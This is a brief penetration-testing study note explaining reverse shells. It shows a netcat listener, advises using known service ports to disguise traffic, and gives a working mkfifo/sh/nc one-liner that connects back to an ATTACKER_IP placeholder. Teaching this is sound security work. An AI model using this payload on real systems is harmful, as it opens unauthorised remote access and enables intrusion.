---
tags:
---
A Reverse [[Shell]] is **one of the most popular techniques for gaining access to a system when penetration testing**.
The concept is simple: make the target **initiate a connection back to you** so you can avoid [[Firewall]]s and other security mechanisms.
# Example
## Attacker side
You can use tools such as a [[Netcat]] listener to listen to incoming connections.
Try to use known ports of other services to listen, to disguise your traffic a little.
```sh
nc -lvnp 8888 # Listen on port 8888 for an incoming connection
```
## Target side
Once the attacker side is listening, you can use a *reverse shell payload* to initiate (open) the connection towards the attacker's IP.
### Payload examples
Here's an online [cheatsheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) of notable reverse shell payloads.
```sh
# This uses a named pipe (FIFO) to receive commands and write output to.
# nc then sends this output back to the attacker using what the sh is giving back
# This creates a loop: the attacker sends commands via netcat, which are written to /tmp/f, read by cat and given to sh, which in turns gives back output via netcat.
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```